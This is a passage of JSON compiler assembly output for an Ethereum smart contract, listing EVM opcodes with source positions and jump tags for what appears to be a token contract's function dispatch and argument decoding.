											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"value": "22"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST"
										},
										{
											"begin": 33,
											"end": 36,
											"name": "DUP4"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "DUP2"
										},
										{
											"begin": 27,
											"end": 37,
											"name": "LT"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"value": "24"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPI"
										},
										{
											"begin": 90,
											"end": 101,
											"name": "DUP2"
										},
										{
											"begin": 90,
											"end": 101,
											"name": "DUP2"
										},
										{
											"begin": 90,
											"end": 101,
											"name": "ADD"
										},
										{
											"begin": 84,
											"end": 102,
											"name": "MLOAD"
										},
										{
											"begin": 71,
											"end": 82,
											"name": "DUP4"
										},
										{
											"begin": 71,
											"end": 82,
											"name": "DUP3"
										},
										{
											"begin": 71,
											"end": 82,
											"name": "ADD"
										},
										{
											"begin": 64,
											"end": 103,
											"name": "MSTORE"
										},
										{
											"begin": 52,
											"end": 54,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 45,
											"end": 55,
											"name": "ADD"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"value": "22"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMP"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"value": "24"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST"
										},
										{
											"begin": 12,
											"end": 26,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ADD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "AND"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ISZERO"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH [tag]",
											"value": "25"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "JUMPI"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP3"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SUB"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MLOAD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SUB"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "EXP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SUB"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "NOT"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "AND"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MSTORE"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ADD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "tag",
											"value": "25"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "JUMPDEST"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP3"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MLOAD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SUB"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "RETURN"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "tag",
											"value": "4"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "JUMPDEST"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "PUSH [tag]",
											"value": "26"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "DUP1"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "27"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "27"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "DUP2"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "AND"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SWAP1"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "ADD"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "PUSH [tag]",
											"value": "28"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "tag",
											"value": "26"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "JUMPDEST"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "DUP1"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "MLOAD"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SWAP2"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "ISZERO"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "ISZERO"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "DUP3"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "MSTORE"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "MLOAD"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SWAP1"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "DUP2"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SWAP1"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SUB"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "ADD"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SWAP1"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "RETURN"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "tag",
											"value": "5"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "JUMPDEST"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "PUSH [tag]",
											"value": "30"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "tag",
											"value": "29"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "JUMPDEST"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "DUP1"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "MLOAD"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "SWAP2"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "DUP3"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "MSTORE"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "MLOAD"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "SWAP1"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "DUP2"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "SWAP1"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "SUB"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "ADD"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "SWAP1"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "RETURN"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "tag",
											"value": "6"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "JUMPDEST"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "PUSH [tag]",
											"value": "26"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "DUP1"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "32"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "32"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "DUP2"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "DUP2"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "AND"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "SWAP2"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "DUP2"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "ADD"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "SWAP1"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "SWAP2"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "AND"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "SWAP1"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "ADD"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "PUSH [tag]",
											"value": "33"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "tag",
											"value": "7"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "JUMPDEST"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "PUSH [tag]",
											"value": "35"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "tag",
											"value": "8"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "JUMPDEST"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "PUSH [tag]",
											"value": "36"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "PUSH [tag]",
											"value": "37"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "tag",
											"value": "36"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "JUMPDEST"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "DUP1"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "MLOAD"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "SWAP1"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "SWAP3"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "AND"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "DUP3"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "MSTORE"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "MLOAD"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "SWAP1"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "DUP2"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "SWAP1"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "SUB"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "ADD"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "SWAP1"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "RETURN"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "tag",
											"value": "9"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "JUMPDEST"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "PUSH [tag]",
											"value": "39"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "tag",
											"value": "10"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "JUMPDEST"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "DUP1"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "41"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "41"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "CALLDATALOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "AND"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "PUSH [tag]",
											"value": "42"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "tag",
											"value": "11"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "JUMPDEST"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "DUP1"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "44"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "44"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "CALLDATALOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "AND"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "PUSH [tag]",
											"value": "45"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "tag",
											"value": "12"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "JUMPDEST"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "DUP1"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "47"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "47"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "CALLDATALOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "AND"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "PUSH [tag]",
											"value": "48"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "tag",
											"value": "13"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "JUMPDEST"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "PUSH [tag]",
											"value": "20"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "PUSH [tag]",
											"value": "50"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "tag",
											"value": "14"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "JUMPDEST"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "PUSH [tag]",
											"value": "26"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "DUP1"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "56"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "56"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "DUP2"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "AND"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "SWAP1"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "ADD"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "PUSH [tag]",
											"value": "57"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "tag",
											"value": "15"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "JUMPDEST"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH [tag]",
											"value": "58"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP1"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 16,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 17,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "59"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "59"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "AND"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "ADD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP1"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "AND"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP1"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "ADD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP1"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "ADD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP1"
										},
										{
											"begin": 3475,
											"end": 4439,
